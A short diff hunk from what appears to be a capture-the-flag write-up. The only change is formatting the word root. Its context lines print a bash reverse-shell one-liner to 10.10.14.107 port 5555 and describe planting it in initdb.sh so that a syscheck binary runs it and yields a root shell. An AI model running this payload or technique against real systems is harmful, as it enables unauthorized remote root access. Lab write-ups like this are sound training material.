@@ -133,4 +133,4 @@ After reviewing the code, it checks for a process named initdb.sh. If the proces
 ```
 0<&196;exec 196<>/dev/tcp/10.10.14.107/5555; sh <&196 >&196 2>&196
 ```
-When `/usr/bin/syscheck` was executed, it returned an error. Since `initdb.sh` did not exist, the file was created with a reverse shell payload. After a few seconds, a reverse shell was obtained as the root user.
+When `/usr/bin/syscheck` was executed, it returned an error. Since `initdb.sh` did not exist, the file was created with a reverse shell payload. After a few seconds, a reverse shell was obtained as the `root` user.
